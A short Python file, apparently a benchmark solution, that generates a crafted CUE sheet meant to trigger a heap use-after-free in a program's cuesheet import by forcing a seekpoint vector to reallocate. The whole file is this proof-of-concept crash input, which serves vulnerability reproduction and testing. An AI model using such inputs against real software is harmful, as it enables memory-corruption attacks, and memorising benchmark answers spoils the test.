import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in the cuesheet import operation.
        The vulnerability occurs when appending seekpoints (derived from INDEX entries) causes a vector 
        reallocation while a reference to an old element is still in use.
        """
        
        # Construct a CUE sheet (text based)
        # We need a minimal valid header to start processing TRACKs and INDEXes
        poc = b'FILE "crash.wav" WAVE\n'
        poc += b'  TRACK 01 AUDIO\n'
        
        # Add multiple INDEX entries.
        # Each INDEX corresponds to a seekpoint in the internal structure.
        # By adding enough indices, we force the underlying storage (e.g., std::vector)
        # to reallocate, invalidating any stale pointers/iterators held by the vulnerable code.
        # 9 indices should be sufficient to trigger reallocation for common initial capacities (e.g. 4 or 8).
        for i in range(1, 10):
            # Format: INDEX <number> <mm:ss:ff>
            poc += f'    INDEX {i:02d} 00:00:{i:02d}\n'.encode('utf-8')
            
        return poc
